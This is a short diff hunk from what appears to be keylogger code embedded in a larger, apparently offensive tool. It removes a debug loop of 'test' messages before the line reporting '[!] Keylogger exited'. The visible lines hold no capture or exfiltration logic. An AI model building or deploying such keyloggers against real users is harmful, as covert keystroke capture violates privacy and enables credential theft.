@@ -782,11 +782,6 @@ def to_keysyms(released, group, level):
     return u''.join(keys)
 run()
 
-x = 0
-while x < 4:
-    sleep(6)
-    job_message_buffer('test '+str(x)+'\\n')
-    x += 1
 job_message_buffer('[!] Keylogger exited\\n')
 
 """
